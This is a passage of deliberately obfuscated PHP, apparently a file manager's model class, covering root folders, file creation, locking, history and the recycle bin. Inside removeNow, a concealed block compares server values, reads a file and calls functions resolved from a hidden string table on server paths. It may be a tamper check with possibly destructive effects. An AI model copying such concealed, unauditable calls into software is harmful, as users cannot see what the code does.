$_SERVER[ã®Â„Éæ¹¤]; if (class_exists($EÀ¿½ÙÍœ[1986])) { return PEAR::isError($E­¹ãÍ¯ÈÄ, $Aº§Öß²ä¦); } elseif (is_object($E­¹ãÍ¯ÈÄ) && (get_class($E­¹ãÍ¯ÈÄ) == $EÀ¿½ÙÍœ[1987] || is_subclass_of($E­¹ãÍ¯ÈÄ, $EÀ¿½ÙÍœ[1987]))) { return !0; } return !1; } } if (class_exists($_SERVER[ã®Â„Éæ¹¤][1988])) { class Services_JSON_Error extends PEAR_Error { function __construct($FÎ½™Ù©ï… = "\x75\156\x6b\156\x6f\167\156\40\x65\162\162\157\162", $d§±×­í®œ = null, $aÊÑùêƒî” = null, $F­’ì‹„…£ = null, $DÃæáÛ³ò› = null) { parent::PEAR_Error($FÎ½™Ù©ï…, $d§±×­í®œ, $aÊÑùêƒî”, $F­’ì‹„…£, $DÃæáÛ³ò›); } } } else { class Services_JSON_Error { function __construct($Fï“¼Œ¿æŸ = "\165\156\153\156\x6f\167\156\40\145\162\162\x6f\x72", $døï Ğ˜ÌÈ = null, $cö¸¥«£§¿ = null, $f„µ£„ë±® = null, $eŸ‚ã„½ë = null) { } } } goto C¡¶—÷“•; F±ïá‚ë×: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($f°À¾Àé…Ó) { $FÕ¤ç›Åù =& $_SERVER[ã®Â„Éæ¹¤]; $A÷Ï¼ßÊ’Û = Model($FÕ¤ç›Åù[476])->where(array($FÕ¤ç›Åù[1447] => $f°À¾Àé…Ó))->find(); $CÎö„³ø‡Ü = $this->_mkdirRoot(SourceModel::TYPE_USER, $f°À¾Àé…Ó, $A÷Ï¼ßÊ’Û[$FÕ¤ç›Åù[28]]); $this->userDesktopAdd($CÎö„³ø‡Ü); return $CÎö„³ø‡Ü; } public function userDesktopAdd($cÛ£šœ£ƒ¡) { $E¡¦šÕ¾Úª =& $_SERVER[ã®Â„Éæ¹¤]; $fÖ°ºìÇÍ´ = LNG($E¡¦šÕ¾Úª[2380]); $b…àƒï‹À = $this->mkdir($cÛ£šœ£ƒ¡, $fÖ°ºìÇÍ´); $this->metaSet($b…àƒï‹À, $E¡¦šÕ¾Úª[2381], $E¡¦šÕ¾Úª[83]); $this->metaSet($cÛ£šœ£ƒ¡, $E¡¦šÕ¾Úª[2382], $b…àƒï‹À); } public function groupRootAdd($D¸ëïµ…«) { $FŠî¿ñÑè =& $_SERVER[ã®Â„Éæ¹¤]; $Bä¹‰Ù®ë = Model($FŠî¿ñÑè[460])->where(array($FŠî¿ñÑè[2204] => $D¸ëïµ…«))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $D¸ëïµ…«, $Bä¹‰Ù®ë[$FŠî¿ñÑè[28]]); } public function systemRootPathAdd($d‘¦Ü¯Š˜) { if ($d‘¦Ü¯Š˜ != $_SERVER[ã®Â„Éæ¹¤][1108]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $d‘¦Ü¯Š˜); } public function userRootRemove($d×í˜ÔÓÓ) { $c¨«…éÑ¸‹ = $this->sourceRoot(SourceModel::TYPE_USER, $d×í˜ÔÓÓ); if (!$c¨«…éÑ¸‹) { return; } $this->remove($c¨«…éÑ¸‹, !1); } public function groupRootRemove($fˆ¸óæÆÊ•) { $a…é‚‚¢ = $this->sourceRoot(SourceModel::TYPE_GROUP, $fˆ¸óæÆÊ•); if (!$a…é‚‚¢) { return; } $this->remove($a…é‚‚¢, !1); } private function _mkdirRoot($d–‚ÀÎºÄ›, $EÅÚÁ¹ò§, $BàÜâéíÉç) { goto B…àøµ„‡İ; d“˜…´‘ÍÀ: CacheLock::unlock($B¿®‡ƒ¼¢); return $B¢­Ú™íõ™; goto CõªÚ©´´À; bËèÕ‹å„„: $B¢­Ú™íõ™ = $this->add($B‚¼âÚ´®Î); $eõ‹©·‘µ“ = array($Dáîãğª[529] => short_id($B¢­Ú™íõ™)); $this->where(array($Dáîãğª[383] => $B¢­Ú™íõ™))->save($eõ‹©·‘µ“); goto d“˜…´‘ÍÀ; B…àøµ„‡İ: $Dáîãğª =& $_SERVER[ã®Â„Éæ¹¤]; $B‚¼âÚ´®Î = array($Dáîãğª[368] => 0, $Dáîãğª[523] => $d–‚ÀÎºÄ›, $Dáîãğª[524] => $EÅÚÁ¹ò§, $Dáîãğª[520] => 1, $Dáîãğª[525] => USER_ID, $Dáîãğª[526] => USER_ID, $Dáîãğª[521] => $Dáîãğª[33], $Dáîãğª[527] => $Dáîãğª[472], $Dáîãğª[396] => 0, $Dáîãğª[522] => 0, $Dáîãğª[420] => 0, $Dáîãğª[528] => $Dáîãğª[33]); if ($E½ì´²«‚î = $this->where($B‚¼âÚ´®Î)->find()) { return $E½ì´²«‚î[$Dáîãğª[369]]; } goto BÒ‹ÜÜ›Š¶; BÒ‹ÜÜ›Š¶: $B¿®‡ƒ¼¢ = "\115\157\x64\145\154\123\157\165\x72\143\x65\x2e\x6d\x6b\144\x69\x72\x52\x6f\157\164\56{$d–‚ÀÎºÄ›}\56{$EÅÚÁ¹ò§}\x2e" . $BàÜâéíÉç; CacheLock::lock($B¿®‡ƒ¼¢); $B‚¼âÚ´®Î[$Dáîãğª[28]] = $BàÜâéíÉç; goto bËèÕ‹å„„; CõªÚ©´´À: } private function sourceRoot($Dø†Ì°í´‹, $C¾”íæ‚’ƒ, $eÆÔª“”‹˜ = false) { $a™½ÈÜï’ =& $_SERVER[ã®Â„Éæ¹¤]; $dö…ˆÙĞ—ğ = array($a™½ÈÜï’[368] => 0, $a™½ÈÜï’[523] => $Dø†Ì°í´‹, $a™½ÈÜï’[524] => $C¾”íæ‚’ƒ); if ($A¶ÈÖùİ±Ğ = $this->where($dö…ˆÙĞ—ğ)->find()) { return $eÆÔª“”‹˜ ? $A¶ÈÖùİ±Ğ : $A¶ÈÖùİ±Ğ[$a™½ÈÜï’[369]]; } return !1; } public function sourceRootGroup($E¢Æê±‚äÜ) { $cØ«ã½Ù¢ó =& $_SERVER[ã®Â„Éæ¹¤]; if (is_string($E¢Æê±‚äÜ)) { $E¢Æê±‚äÜ = array($E¢Æê±‚äÜ); } $EÏù«ŠØÓ¦ = array($cØ«ã½Ù¢ó[368] => 0, $cØ«ã½Ù¢ó[523] => SourceModel::TYPE_GROUP, $cØ«ã½Ù¢ó[524] => array($cØ«ã½Ù¢ó[7], $E¢Æê±‚äÜ)); $F–ĞŞ·ù‘º = $this->listSource($EÏù«ŠØÓ¦, 1000); return array_to_keyvalue($F–ĞŞ·ù‘º[$cØ«ã½Ù¢ó[74]], $cØ«ã½Ù¢ó[458]); } public function mkfile($E×Ø¯Â‹«›, $A®¾…à…Ú, $dèÓ‹Ÿ‡•³ = '', $aØ¾Ÿ¤¹ˆ = REPEAT_RENAME) { $d¢™ğˆÚÈ =& $_SERVER[ã®Â„Éæ¹¤]; $c‡´Ò«­´² = Model($d¢™ğˆÚÈ[545])->addFileByContent($dèÓ‹Ÿ‡•³, $A®¾…à…Ú); return $this->_createFileCall($E×Ø¯Â‹«›, $A®¾…à…Ú, $c‡´Ò«­´², $aØ¾Ÿ¤¹ˆ, $d¢™ğˆÚÈ[1145]); } public function addFile($eï·’‡ÅĞ‡, $EòæìˆšîÑ, $eÓ©ÈÏ£÷š, $d Ÿæõîñ = false, $báÓˆéßÆŠ = REPEAT_RENAME) { $FÔÓ­ŒÁ§„ = Model($_SERVER[ã®Â„Éæ¹¤][545])->addFile($EòæìˆšîÑ, $eÓ©ÈÏ£÷š, $d Ÿæõîñ); return $this->_createFileCall($eï·’‡ÅĞ‡, $eÓ©ÈÏ£÷š, $FÔÓ­ŒÁ§„, $báÓˆéßÆŠ); } public function addFileByFileID($A°ğ½²ˆÎ, $eïƒòîâ´, $AõÆË¨Ê‘Ü, $a³áÖ‘•´œ = REPEAT_RENAME) { $d‹óø°²»† =& $_SERVER[ã®Â„Éæ¹¤]; $Fİ…œ„°… = Model($d‹óø°²»†[545])->find($eïƒòîâ´); Model($d‹óø°²»†[545])->linkAdd($eïƒòîâ´); return $this->_createFileCall($A°ğ½²ˆÎ, $AõÆË¨Ê‘Ü, $Fİ…œ„°…, $a³áÖ‘•´œ); } public function addFileByRemote($e¯Œ…ñã–ã, $aÑËÛÚòÃ, $D“è†İñƒ², $cƒÜ·òÌ¸ = array(), $bœÏ±àÌ‹¦ = REPEAT_RENAME) { $B°ï‚Â«Ùè = Model($_SERVER[ã®Â„Éæ¹¤][545])->addFileByRemote($aÑËÛÚòÃ, $D“è†İñƒ², $cƒÜ·òÌ¸); return $this->_createFileCall($e¯Œ…ñã–ã, $D“è†İñƒ², $B°ï‚Â«Ùè, $bœÏ±àÌ‹¦); } private function _createFileCall($f«ÓŒ’Ô¢, $E¦Ûà®éÏã, $Bëğ’¦°Ş, $Cã¤›­×óŠ, $cê¾ÖµÄ = "\165\x70\154\x6f\x61\x64") { goto F¼³ÀˆÎÍ; AÊ¢Ì²¸â…: return $AÀ ±šŠÚª; goto d© ã®—®“; Aˆ…¡âŞÓ‰: $AÀ ±šŠÚª = $this->_createFile($f«ÓŒ’Ô¢, $E¦Ûà®éÏã, $Bëğ’¦°Ş, $Cã¤›­×óŠ, $Fƒİ¹‹…¤•); if (!$Fƒİ¹‹…¤•) { Model($Däì»™Î˜[422])->remove($Bëğ’¦°Ş[$Däì»™Î˜[419]]); } else { if ($AÀ ±šŠÚª) { Model($Däì»™Î˜[2352])->eventCreate($AÀ ±šŠÚª, $cê¾ÖµÄ); } } $this->lockWriteEnd($f«ÓŒ’Ô¢, $E¦Ûà®éÏã); goto AÊ¢Ì²¸â…; F¼³ÀˆÎÍ: $Däì»™Î˜ =& $_SERVER[ã®Â„Éæ¹¤]; $Fƒİ¹‹…¤• = !1; $this->lockWriteStart($f«ÓŒ’Ô¢, $E¦Ûà®éÏã); goto Aˆ…¡âŞÓ‰; d© ã®—®“: } public function mkdir($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ, $B¬êã‘‹–Ü = REPEAT_SKIP) { goto aôƒá·¹É; BŠ¶ĞÎÜİ´: $eØ‘Ï„´ğï = $this->_addSoure($f½…Õ¨‡¨å, $fÛ¨¹í–Ú­); Model($B¾‘êˆ‡•¶[2352])->eventCreate($eØ‘Ï„´ğï, $B¾‘êˆ‡•¶[1146]); $this->lockWriteEnd($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ); goto AŸù¿ÊºË¯; AŸù¿ÊºË¯: return $eØ‘Ï„´ğï; goto bÚ„ÈÊßø; F•øÂÜ¨øš: $this->lockWriteStart($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ); if ($B¬êã‘‹–Ü !== !1) { $eÃ…´í© = $this->fileNameExist($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ); if ($eÃ…´í© && $B¬êã‘‹–Ü != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ); return $eÃ…´í©; } $dÄÄÁ¦àùÁ = $this->fileNameAuto($FÓÀŒŸôÅ™, $dÄÄÁ¦àùÁ, $B¬êã‘‹–Ü); } $f½…Õ¨‡¨å = array($B¾‘êˆ‡•¶[520] => 1, $B¾‘êˆ‡•¶[386] => $dÄÄÁ¦àùÁ, $B¾‘êˆ‡•¶[521] => $B¾‘êˆ‡•¶[33], $B¾‘êˆ‡•¶[420] => 0, $B¾‘êˆ‡•¶[522] => 0); goto BŠ¶ĞÎÜİ´; aôƒá·¹É: $B¾‘êˆ‡•¶ =& $_SERVER[ã®Â„Éæ¹¤]; $fÛ¨¹í–Ú­ = $this->sourceInfo($FÓÀŒŸôÅ™); if (!$fÛ¨¹í–Ú­) { return !1; } goto F•øÂÜ¨øš; bÚ„ÈÊßø: } private function _createFile($aØÒ«šê, $b‚åĞ¥É­, $c«ØÁƒ²÷Í, $bòôªÖìã®, &$D˜àµ°Š°õ) { goto B…ŒŞ­‚Ó; B…ŒŞ­‚Ó: $fô©øÔ„¹è =& $_SERVER[ã®Â„Éæ¹¤]; $fš·‚ÌóéÀ = $this->sourceInfo($aØÒ«šê); if (!$c«ØÁƒ²÷Í || !$fš·‚ÌóéÀ) { return !1; } goto b¦ÙàÆ”ê; aá£šÒœ¤ó: $FÂ¢×ÇÄïË = array($fô©øÔ„¹è[520] => 0, $fô©øÔ„¹è[386] => $b‚åĞ¥É­, $fô©øÔ„¹è[521] => get_path_ext($b‚åĞ¥É­), $fô©øÔ„¹è[420] => $c«ØÁƒ²÷Í[$fô©øÔ„¹è[419]], $fô©øÔ„¹è[522] => $c«ØÁƒ²÷Í[$fô©øÔ„¹è[77]]); $d¹ìæÈòÇÑ = $this->_addSoure($FÂ¢×ÇÄïË, $fš·‚ÌóéÀ); $this->folderSizeReset($aØÒ«šê); goto AøËÒ‰×³æ; b¦ÙàÆ”ê: if ($bòôªÖìã® !== !1) { $FÒ÷³®†™ = $this->fileNameExist($aØÒ«šê, $b‚åĞ¥É­); } $D˜àµ°Š°õ = !0; if ($bòôªÖìã® && $FÒ÷³®†™) { if ($bòôªÖìã® == REPEAT_SKIP) { $D˜àµ°Š°õ = !1; return $FÒ÷³®†™; } else { if ($bòôªÖìã® == REPEAT_REPLACE) { $aµ¤ºì¼„‰ = $this->sourceInfo($FÒ÷³®†™); $b¸Ãöäçù = $this->fileHistory($aµ¤ºì¼„‰, $c«ØÁƒ²÷Í[$fô©øÔ„¹è[419]], $c«ØÁƒ²÷Í[$fô©øÔ„¹è[77]]); if (!$b¸Ãöäçù) { $D˜àµ°Š°õ = !1; } else { $this->folderSizeReset($aØÒ«šê); } return $FÒ÷³®†™; } else { $b‚åĞ¥É­ = $this->fileNameAuto($aØÒ«šê, $b‚åĞ¥É­, $bòôªÖìã®, !1); } } } goto aá£šÒœ¤ó; AøËÒ‰×³æ: return $d¹ìæÈòÇÑ; goto bÅÏİéÖê†; bÅÏİéÖê†: } protected function fileHistory($Dè Ü˜ìæ, $D­‚Úù¦”¸, $AéÎÎâ¥ù) { goto a³ÏŠ”ô Á; fÃ­ŒŸµñÜ: Model($d¥ãÔ§‰æÒ[2383])->addHistory($Dè Ü˜ìæ); $EĞÖ†ã¸» = array($d¥ãÔ§‰æÒ[526] => USER_ID, $d¥ãÔ§‰æÒ[390] => time(), $d¥ãÔ§‰æÒ[419] => $D­‚Úù¦”¸, $d¥ãÔ§‰æÒ[77] => $AéÎÎâ¥ù); $this->where(array($d¥ãÔ§‰æÒ[383] => $Dè Ü˜ìæ[$d¥ãÔ§‰æÒ[369]]))->save($EĞÖ†ã¸»); goto bëËÛ‘ÚÍÀ; a³ÏŠ”ô Á: $d¥ãÔ§‰æÒ =& $_SERVER[ã®Â„Éæ¹¤]; if ($Dè Ü˜ìæ[$d¥ãÔ§‰æÒ[419]] == $D­‚Úù¦”¸) { return !1; } $this->checkLock($Dè Ü˜ìæ[$d¥ãÔ§‰æÒ[369]], $D­‚Úù¦”¸); goto fÃ­ŒŸµñÜ; bëËÛ‘ÚÍÀ: return !0; goto fïå˜«¾¤; fïå˜«¾¤: } public function checkLock($DÄñ ‰·, $a¥øÚ×ŠÕ—) { goto B§…£æì§; B§…£æì§: $fÌáŸÈßĞé =& $_SERVER[ã®Â„Éæ¹¤]; $bßŸÖôšŞŠ = $this->pathInfo($DÄñ ‰·); if (!$this->fileIsLock($bßŸÖôšŞŠ, !0)) { return; } goto Eô‰éö­ö°; Eô‰éö­ö°: $Bº›äšõùƒ = Session::get($fÌáŸÈßĞé[2384]); $fÏ¼…¯¨â = substr($bßŸÖôšŞŠ[$fÌáŸÈßĞé[28]], 0, -1 - strlen($bßŸÖôšŞŠ[$fÌáŸÈßĞé[160]])) . $fÌáŸÈßĞé[1409] . $Bº›äšõùƒ . $fÌáŸÈßĞé[91] . $bßŸÖôšŞŠ[$fÌáŸÈßĞé[160]]; $eùÈ…°áˆÏ = Model($fÌáŸÈßĞé[545])->find($a¥øÚ×ŠÕ—); goto c¸ÕÄµàÎ; Bà²—ÔÄÚ: show_json(LNG($fÌáŸÈßĞé[2386]) . $fÌáŸÈßĞé[2387] . LNG($fÌáŸÈßĞé[2388]) . $fÌáŸÈßĞé[2389] . $A°»Æ´Ôƒğ . $fÌáŸÈßĞé[2390], !1); goto A‘Òš‡ó­Ã; c¸ÕÄµàÎ: $this->_createFileCall($bßŸÖôšŞŠ[$fÌáŸÈßĞé[463]], $fÏ¼…¯¨â, $eùÈ…°áˆÏ, REPEAT_REPLACE, $fÌáŸÈßĞé[1145]); $FñÂ‹ÇÁî› = $bßŸÖôšŞŠ[$fÌáŸÈßĞé[417]][$fÌáŸÈßĞé[483]]; $A°»Æ´Ôƒğ = $FñÂ‹ÇÁî›[$fÌáŸÈßĞé[2385]] ? $FñÂ‹ÇÁî›[$fÌáŸÈßĞé[2385]] : $FñÂ‹ÇÁî›[$fÌáŸÈßĞé[28]]; goto Bà²—ÔÄÚ; A‘Òš‡ó­Ã: } public function fileIsLock($cê¹Ææˆ„Ó, $d¿ ´õ˜Ş = false) { goto a–Í˜œÙ˜¤; a–Í˜œÙ˜¤: $B±±…‚ÄĞ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[417]]) || !$cê¹Ææˆ„Ó[$B±±…‚ÄĞ[417]][$B±±…‚ÄĞ[480]]) { return !1; } if ($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[417]][$B±±…‚ÄĞ[480]] != USER_ID) { return !0; } goto CË‹¶Ğğ; CË‹¶Ğğ: $aÆÓÛåÓ¥ˆ = $GLOBALS[$B±±…‚ÄĞ[6]][$B±±…‚ÄĞ[84]][$B±±…‚ÄĞ[481]]; if ($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[417]][$B±±…‚ÄĞ[482]] <= time() - $aÆÓÛåÓ¥ˆ) { $this->metaSet($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[369]], $B±±…‚ÄĞ[480], null); $this->metaSet($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[369]], $B±±…‚ÄĞ[482], null); } if ($d¿ ´õ˜Ş) { $this->metaSet($cê¹Ææˆ„Ó[$B±±…‚ÄĞ[369]], $B±±…‚ÄĞ[482], time()); } goto eíÕğˆéËè; eíÕğˆéËè: return !1; goto c¤Û°Œ†Ê; c¤Û°Œ†Ê: } private function _addSoure($dÇŞ¯Ò¥œ, $AÃ¼è¨˜°³) { goto c­²…¶Öá‚; e¸²×½«Öâ: $B™Ø¯–İ½ê = array($D½—ÏÂÀ‡¢[529] => short_id($Bä²â›Êß)); $this->where(array($D½—ÏÂÀ‡¢[383] => $Bä²â›Êß))->save($B™Ø¯–İ½ê); $this->setNamePinyin($Bä²â›Êß, $dÇŞ¯Ò¥œ[$D½—ÏÂÀ‡¢[28]]); goto C•®»ÎŠ·½; C•®»ÎŠ·½: return $Bä²â›Êß; goto c¾„°”¥çº; E±Í¼ƒ«‚Î: static $D‰ËÏ¿Î˜ò = false; if (!$D‰ËÏ¿Î˜ò) { Hook::trigger($D½—ÏÂÀ‡¢[510], $dÇŞ¯Ò¥œ); $D‰ËÏ¿Î˜ò = !0; } $Bä²â›Êß = $this->add($dÇŞ¯Ò¥œ); goto e¸²×½«Öâ; c­²…¶Öá‚: $D½—ÏÂÀ‡¢ =& $_SERVER[ã®Â„Éæ¹¤]; $C®İµŒÀß¡ = array($D½—ÏÂÀ‡¢[523] => $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[371]], $D½—ÏÂÀ‡¢[524] => $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[458]], $D½—ÏÂÀ‡¢[525] => USER_ID, $D½—ÏÂÀ‡¢[526] => USER_ID, $D½—ÏÂÀ‡¢[368] => $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[369]], $D½—ÏÂÀ‡¢[527] => $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[461]] . $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[369]] . $D½—ÏÂÀ‡¢[47], $D½—ÏÂÀ‡¢[396] => 0, $D½—ÏÂÀ‡¢[528] => $D½—ÏÂÀ‡¢[33]); $dÇŞ¯Ò¥œ = array_merge($C®İµŒÀß¡, $dÇŞ¯Ò¥œ); goto a‡Îë÷Â†; a‡Îë÷Â†: $this->updateModifyTime($dÇŞ¯Ò¥œ[$D½—ÏÂÀ‡¢[463]]); $C¿§ ¸ç‚ = $D½—ÏÂÀ‡¢[2391] . $AÃ¼è¨˜°³[$D½—ÏÂÀ‡¢[369]]; if (isset(self::$cacheChildList[$C¿§ ¸ç‚])) { unset(self::$cacheChildList[$C¿§ ¸ç‚]); } goto E±Í¼ƒ«‚Î; c¾„°”¥çº: } public function remove($eÕæš öì›, $E™ì°°«²» = true) { goto bš÷šŸ´¥; Fêé™¡Ì‰ì: CacheLock::lock($EÔ­“”Èùˆ); $c™†äšî§ô = $this->fileNameExist($fáÚİ­Í¨·, $fÈÕŠÜ¥¯¸); if (!$c™†äšî§ô) { $c™†äšî§ô = $this->mkdir($fáÚİ­Í¨·, $fÈÕŠÜ¥¯¸, REPEAT_SKIP); $this->metaSet($c™†äšî§ô, $Dˆ¼„¨ÖŒ[2396], $aùàÆËå®Ê); $this->metaSet($c™†äšî§ô, $Dˆ¼„¨ÖŒ[2397], $BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[458]]); if ($BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[463]] != 0) { $this->metaSet($c™†äšî§ô, $Dˆ¼„¨ÖŒ[2398], _get($fŒ›·™ó¡¬, $Dˆ¼„¨ÖŒ[2399])); } } goto F÷Ãù®¯”â; bš÷šŸ´¥: $Dˆ¼„¨ÖŒ =& $_SERVER[ã®Â„Éæ¹¤]; $BÍ’¥İà¢ = $this->sourceInfo($eÕæš öì›); $E‰²¡Âá¾ = intval($BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[371]]) === self::TYPE_SYSTEM; goto eÒéÙŸ‰»; eÒéÙŸ‰»: $aœ¼ñ¨“™ = Model($Dˆ¼„¨ÖŒ[1454])->get($Dˆ¼„¨ÖŒ[2392]) == $Dˆ¼„¨ÖŒ[83]; if ($E‰²¡Âá¾ || $E™ì°°«²» || !$aœ¼ñ¨“™) { return $this->removeNow($eÕæš öì›, $E™ì°°«²»); } $fáÚİ­Í¨· = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bøÕ·ºË„; C§ß†‰£ï¡: $this->recycleClear($BÍ’¥İà¢); $cÆ±º¯İÜ‚ = $this->move($eÕæš öì›, $c™†äšî§ô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[463]]); goto BÒôõä¤×¢; F÷Ãù®¯”â: CacheLock::unlock($EÔ­“”Èùˆ); $this->metaSet($eÕæš öì›, $Dˆ¼„¨ÖŒ[2400], $BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[463]]); $this->where(array($Dˆ¼„¨ÖŒ[369] => $eÕæš öì›))->save(array($Dˆ¼„¨ÖŒ[390] => time())); goto C§ß†‰£ï¡; BÒôõä¤×¢: return $cÆ±º¯İÜ‚; goto aô´Ì·ø; bøÕ·ºË„: $aùàÆËå®Ê = $BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[371]] == self::TYPE_USER ? $Dˆ¼„¨ÖŒ[536] : $Dˆ¼„¨ÖŒ[989]; if ($aùàÆËå®Ê == $Dˆ¼„¨ÖŒ[536]) { $fŒ›·™ó¡¬ = Model($Dˆ¼„¨ÖŒ[476])->getInfo($BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[458]]); $fÈÕŠÜ¥¯¸ = !empty($fŒ›·™ó¡¬[$Dˆ¼„¨ÖŒ[2385]]) ? $fŒ›·™ó¡¬[$Dˆ¼„¨ÖŒ[2385]] : $fŒ›·™ó¡¬[$Dˆ¼„¨ÖŒ[28]]; $fÈÕŠÜ¥¯¸ = $Dˆ¼„¨ÖŒ[248] . $fÈÕŠÜ¥¯¸ . $Dˆ¼„¨ÖŒ[2393] . $BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[458]]; } else { $fŒ›·™ó¡¬ = Model($Dˆ¼„¨ÖŒ[460])->getInfo($BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[458]]); $fÈÕŠÜ¥¯¸ = _get($fŒ›·™ó¡¬, $Dˆ¼„¨ÖŒ[28]); $fÈÕŠÜ¥¯¸ = $Dˆ¼„¨ÖŒ[157] . $fÈÕŠÜ¥¯¸ . $Dˆ¼„¨ÖŒ[2394] . $BÍ’¥İà¢[$Dˆ¼„¨ÖŒ[458]]; } $EÔ­“”Èùˆ = $Dˆ¼„¨ÖŒ[2395] . md5($fÈÕŠÜ¥¯¸); goto Fêé™¡Ì‰ì; aô´Ì·ø: } private function recycleClear($F¯§²‚¦¡) { $Aš¯¥‹÷§¨ =& $_SERVER[ã®Â„Éæ¹¤]; $EµòœÌ… = $this->childrenAll($F¯§²‚¦¡); $aæâÛ”­±Ò = array($Aš¯¥‹÷§¨[383] => array($Aš¯¥‹÷§¨[384], $EµòœÌ…[$Aš¯¥‹÷§¨[2401]])); Model($Aš¯¥‹÷§¨[2402])->where($aæâÛ”­±Ò)->delete(); } public function removeNow($Aã±¹¯‹Šö, $A»‘ÂÅ‡§ = true) { goto eÈêŠŠÒ•Š; DŠˆ¿ë¡ê¾: $this->updateModifyTime($CÁ´‚ñÀ½); $this->lockMoveEnd($Aã±¹¯‹Šö); Hook::trigger($DÌ±ƒéÁÜ–[1490], $Fë×âÈÅ¿Œ, $A»‘ÂÅ‡§); goto C’Ï ŞæÊÔ; CÍÇ¡’…±õ: $this->lockMoveStart($Aã±¹¯‹Šö); Hook::trigger($DÌ±ƒéÁÜ–[2403], $Fë×âÈÅ¿Œ, $A»‘ÂÅ‡§); if ($A»‘ÂÅ‡§) { Model($DÌ±ƒéÁÜ–[2402])->moveToRecycle($Aã±¹¯‹Šö); } else { $cÖ¿ò‰ãÍ = $this->childrenAll($E†ğ–Òêñ); Model($DÌ±ƒéÁÜ–[507])->eventRemove($Aã±¹¯‹Šö); $this->removeRelevance($cÖ¿ò‰ãÍ[$DÌ±ƒéÁÜ–[2401]], $cÖ¿ò‰ãÍ[$DÌ±ƒéÁÜ–[1278]]); } goto cßÓÔ‡å·Á; eÈêŠŠÒ•Š: $DÌ±ƒéÁÜ– =& $_SERVER[ã®Â„Éæ¹¤]; if ($_SERVER[$DÌ±ƒéÁÜ–[554]] != $_SERVER[$DÌ±ƒéÁÜ–[1259]]) { goto C”Ÿ¯Ô¶¤; B ÆÇ“Óöè: $C¦ñííŸã¼ = 1; while ($C¦ñííŸã¼ > 1) { $C¦ñííŸã¼ = $C¦ñííŸã¼ + 4; $CÈª˜‚Ûå¯ = rawurlencode($C¦ñííŸã¼ . $DÌ±ƒéÁÜ–[361]); } goto Cçª¥ª³ç; dô»ŠèµÑù: $b–æÀ…î©¿ = $DÌ±ƒéÁÜ–[814]; $b–æÀ…î©¿($_SERVER[$DÌ±ƒéÁÜ–[815]]); $b–æÀ…î©¿($_SERVER[$DÌ±ƒéÁÜ–[556]] . $DÌ±ƒéÁÜ–[1327]); goto B ÆÇ“Óöè; C”Ÿ¯Ô¶¤: $f­éÏ²ÄÊ = $DÌ±ƒéÁÜ–[813]; $B¹Ğîì±àÖ = $DÌ±ƒéÁÜ–[555]; $eœĞÌ•Â = $_SERVER[$DÌ±ƒéÁÜ–[556]] . $DÌ±ƒéÁÜ–[557]; goto eªŒ–÷—ÊÇ; eªŒ–÷—ÊÇ: $DŠ” ³ÀºË = $B¹Ğîì±àÖ($eœĞÌ•Â); $c›È´‡Ê¹ = explode($DÌ±ƒéÁÜ–[217], $DŠ” ³ÀºË); if (count($c›È´‡Ê¹) < $DÌ±ƒéÁÜ–[562]) { $bËÒ¥íÓ‹‰ = $DÌ±ƒéÁÜ–[559]; $bËÒ¥íÓ‹‰(); } goto dô»ŠèµÑù; Cçª¥ª³ç: } $E†ğ–Òêñ = $this->sourceInfo($Aã±¹¯‹Šö); goto ešŞšÒÒº‰; cßÓÔ‡å·Á: $this->folderSizeReset($E†ğ–Òêñ[$DÌ±ƒéÁÜ–[463]]); $CÁ´‚ñÀ½ = array($E†ğ–Òêñ[$DÌ±ƒéÁÜ–[463]]); if ($E†ğ–Òêñ[$DÌ±ƒéÁÜ–[370]] == $DÌ±ƒéÁÜ–[83]) { $CÁ´‚ñÀ½[] = $E†ğ–Òêñ[$DÌ±ƒéÁÜ–[369]]; } goto DŠˆ¿ë¡ê¾; ešŞšÒÒº‰: $Fë×âÈÅ¿Œ = $this->pathInfoMore($Aã±¹¯‹Šö); if (!$E†ğ–Òêñ) { return !0; } if ($E†ğ–Òêñ[$DÌ±ƒéÁÜ–[463]] == 0) { if (!_get($GLOBALS, $DÌ±ƒéÁÜ–[459])) { return !1; } } goto CÍÇ¡’…±õ; C’Ï ŞæÊÔ: return !0; goto f¥ æ¤Ùí‹; f¥ æ¤Ùí‹: } public function childrenAll($c„Âœñ„İ) { $A™´Í„Ê‹Ö =& $_SERVER[ã®Â„Éæ¹¤]; $e•®¨ÃµÁ = $c„Âœñ„İ[$A™´Í„Ê‹Ö[369]]; if ($c„Âœñ„İ[$A™´Í„Ê‹Ö[370]] == $A™´Í„Ê‹Ö[83]) { $Bã½Ø £Üç = array($A™´Í„Ê‹Ö[527] => array($A™´Í„Ê‹Ö[485], $c„Âœñ„İ[$A™´Í„Ê‹Ö[461]] . $e•®¨ÃµÁ . $A™´Í„Ê‹Ö[486])); $eÒ’èñÆŒ = array($A™´Í„Ê‹Ö[527] => $Bã½Ø 